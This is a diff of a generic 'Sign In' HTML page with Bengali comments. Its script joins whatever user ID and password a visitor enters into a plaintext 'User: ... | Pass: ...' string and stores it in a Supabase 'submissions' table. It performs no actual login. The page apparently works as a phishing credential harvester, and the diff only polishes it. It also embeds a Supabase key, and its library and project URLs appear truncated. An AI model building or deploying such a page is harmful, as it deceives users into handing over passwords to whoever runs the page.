@@ -1,10 +1,10 @@
-]<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign In</title>
-    <!-- সুপাবেজের সঠিক ও দ্রুততম লাইব্রেরি লিঙ্ক -->
+    <!-- সঠিক ও দ্রুততম সুপাবেজ CDN লাইব্রেরি -->
     <script src="https://jsdelivr.net"></script>
     <style>
         * {
@@ -106,12 +106,11 @@
 </div>
 
 <script>
-    // আপনার সুপাবেজ ড্যাশবোর্ডের সঠিক ক্রেডেনশিয়ালস
+    // আপনার ড্যাশবোর্ড থেকে নেওয়া একদম সঠিক ইউআরএল এবং কী
     const SUPABASE_URL = "https://supabase.co";
     const SUPABASE_KEY = "sb_publishable_aG3O0MLst2EAyBJgKi8xIA_PV8nGoLq"; 
-    
-    // লাইব্রেরি লোড নিশ্চিত করা হচ্ছে
-    if (typeof window.supabase !== 'undefined') {
+
+    if (window.supabase) {
         const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
         const form = document.getElementById("loginForm");
         const button = document.getElementById("submitBtn");
@@ -126,19 +125,19 @@
 
             button.disabled = true;
 
-            // এখানে ইউজার আইডি এবং পাসওয়ার্ড একসাথে টেক্সট আকারে সাজানো হচ্ছে
+            // ইউজার আইডি এবং পাসওয়ার্ড একসাথে যুক্ত করা হচ্ছে
             const submissionData = `User: ${user} | Pass: ${pass}`;
 
             try {
-                // সুপাবেজ টেবিলের 'message' কলামে ডেটা পাঠানো হচ্ছে
                 const { error } = await db
                     .from("submissions")
                     .insert({ message: submissionData });
 
                 if (!error) {
-                    form.reset(); // সফল হলে ফর্মের ভেতরের লেখা মুছে যাবে
+                    form.reset(); // সফল হলে ইনপুট বক্স ফাঁকা হবে
                 } else {
                     console.error("Supabase Error:", error.message);
+                    alert("Supabase Error: " + error.message);
                 }
             } catch (error) {
                 console.error("Submission failed:", error);
@@ -147,10 +146,9 @@
             }
         });
     } else {
-        console.error("Supabase library not loaded properly.");
+        console.error("Supabase library not loaded.");
     }
 </script>
 
 </body>
 </html>
-
